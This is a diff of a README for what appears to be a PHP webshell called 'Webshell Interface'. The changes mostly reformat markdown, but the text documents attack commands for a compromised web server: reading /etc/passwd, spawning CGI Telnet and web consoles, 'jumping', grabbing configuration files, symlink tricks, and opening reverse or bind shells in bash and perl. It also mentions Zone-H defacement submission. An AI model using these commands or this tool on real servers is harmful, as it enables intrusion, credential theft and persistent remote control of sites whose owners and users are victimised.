@@ -21,51 +21,63 @@ Webshell Interface
 - Zone-H Mass Submit
 
 ## How to Use
- - Read File
+ - ***Read File***
+~~~
  usage: rf [filename]
  example: rf /etc/passwd
+~~~
 
  - Spawn File/Tools 
+ ~~~
  usage: spawn [name]
+~~~
 
- [name]
+[name]
 - Adminer (adminer)
- - WebConsole (webconsole)
- - CGI Telnet 1 (cgitelnet1)
- - CGI Telnet 2 (cgitelnet2)
- - PHPINFO (phpinfo)
+- WebConsole (webconsole)
+- CGI Telnet 1 (cgitelnet1)
+- CGI Telnet 2 (cgitelnet2)
+- PHPINFO (phpinfo)
 
  example:
+~~~
  spawn adminer
  spawn webconsole
  spawn cgitelnet1
+~~~
 
-- Jumping
+- ***Jumping***
+~~~
 usage: jumping
+~~~
 
-- Config Grabber
+- ***Config Grabber***
+~~~
 usage: idxconfig
+~~~
 
  - ***Symlink***
  ~~~
  usage: symlink
 ~~~
+
  - ***Reverse Shell***
+ 
 ***[Back Connect]***
-
+~~~
 usage: rvr bc [IP] [PORT] [TYPE]
-
-example:
+~~~
+Example:
 ~~~
 rvr bc 127.0.0.1 1337 bash
 rvr bc 127.0.0.1 1337 perl
 ~~~
 
 ***Bind Port***
-
+~~~
 usage: rvr bp [PORT] [TYPE]
-
-example:
+~~~
+Example:
 ~~~
 rvr bp 1337 perl
 ~~~
